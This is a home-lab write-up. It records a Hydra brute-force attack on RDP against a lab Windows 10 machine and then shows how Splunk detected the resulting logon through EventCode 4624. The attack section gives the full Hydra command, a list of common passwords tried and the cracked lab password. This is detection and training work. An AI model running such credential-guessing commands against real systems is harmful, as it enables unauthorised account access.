# Brute Force Attack & Splunk Detection

## Overview
To test whether Splunk was capturing malicious activity, I set up a Kali Linux machine on the private network and ran a brute force attack against RDP on the Windows 10 target machine. Since this is a lab, I included the correct password in the wordlist. The attack succeeded, and Splunk captured the event.

---

## Attack — Hydra RDP Brute Force

**Tool:** Hydra  
**Target:** 192.168.100.100 (Windows 10 domain machine)  
**User:** jsmith  
**Method:** RDP brute force with a custom wordlist

```bash
hydra -l jsmith -P passwords.txt -V -f 192.168.100.100 rdp
```

**Output:**
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 4 tasks per 1 server, overall 4 tasks, 23 login tries (l:1/p:23)
[DATA] attacking rdp://192.168.100.100:3389/
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "david" - 1 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "123456" - 2 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "12345" - 3 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "123456789" - 4 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "password" - 5 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "iloveyou" - 6 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "princess" - 7 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "1234567" - 8 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "rockyou" - 9 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "12345678" - 10 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "abc123" - 11 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "nicole" - 12 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "daniel" - 13 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "babygirl" - 14 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "monkey" - 15 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "lovely" - 16 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "jessica" - 17 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "654321" - 18 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "michael" - 19 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "ashley" - 20 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "qwerty" - 21 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "test.pass@word305" - 22 of 23
**`[3389][rdp] host: 192.168.100.100   login: jsmith   password: test.pass@word305`**            <-- Shows the successful attempt 
1 of 1 target successfully completed, 1 valid password found
```

---

## Detection — Splunk EventCode 4624

After the attack, I searched Splunk for EventCode 4624 (successful logon). The log confirmed the attack was captured.

```
06/03/2026 11:34:52.739 PM
LogName=Security
EventCode=4624
EventType=0
ComputerName=target-pc.clarklabs.test
SourceName=Microsoft Windows security auditing.
Type=Information
Keywords=Audit Success
TaskCategory=Logon

Subject:
    Security ID:        S-1-0-0
    Account Name:       -
    Account Domain:     -

Logon Information:
    Logon Type:         3

New Logon:
    Account Name:       jsmith
    Account Domain:     CLARKLABS

Network Information:
    **`Workstation Name:   kali`**                       <-- Attacking machine hostname
    **`Source Network Address: 192.168.100.254`**         <-- Attacking machine IP

Detailed Authentication Information:
    Authentication Package: NTLM
    Package Name (NTLM only): NTLM V2
    Key Length: 128
```

---

## Key Takeaways

- Splunk successfully captured the brute force logon (EventCode 4624)
- The log identified the attacking machine by hostname (**kali**) and IP address (**192.168.100.254**)
- Logon Type 3 indicates a network-based logon, consistent with an RDP brute force
- This information would allow a SOC analyst to quickly identify and isolate the attacking device on the network